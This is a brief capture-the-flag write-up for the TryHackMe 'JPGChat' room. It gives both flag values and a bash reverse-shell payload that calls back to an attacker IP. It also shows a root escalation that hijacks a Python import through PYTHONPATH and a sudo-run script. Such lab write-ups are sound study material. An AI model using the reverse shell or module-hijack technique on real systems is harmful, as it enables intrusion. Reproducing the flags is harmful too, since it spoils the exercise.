# TryHackMe JPGChat

> Saikat Karmakar | May 5 : 2021

---

## Task 1
1. Establish a foothold and get user.txt
```
JPC{487030410a543503cbb59ece16178318}
```
2. Escalate your privileges to root and read root.txt
```
JPC{665b7f2e59cf44763e5a7f070b081b0a}
```

-----------
***Notes***
-----------
- admin name = `Mozzie-jpg`

- payload
```bash
bash -i >& /dev/tcp/10.4.23.120/9999 0>&1;
```

- `PYTHONPATH` is an environment variable which you can set to add additional directories where python will look for modules and packages. 

`https://www.tutorialspoint.com/What-is-PYTHONPATH-environment-variable-in-Python#:~:text=PYTHONPATH%20is%20an%20environment%20variable,needed%20for%20Python%20to%20run.`

- permissions
```bash
wes@ubuntu-xenial:/$ ls -la /opt/development/test_module.py
-rw-r--r-- 1 root root 93 Jan 15 18:58 /opt/development/test_module.py
```
 - we can only run it

- test_module.py contents
```py
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```
- expolit compare.py
```py
import os
os.system("/bin/bash")
```
- export the path of the compare.py to `PYTHONPATH`

- exe the file with sudo
```bash
wes@ubuntu-xenial:~$ sudo /usr/bin/python3 /opt/development/test_module.py
```
- got the root 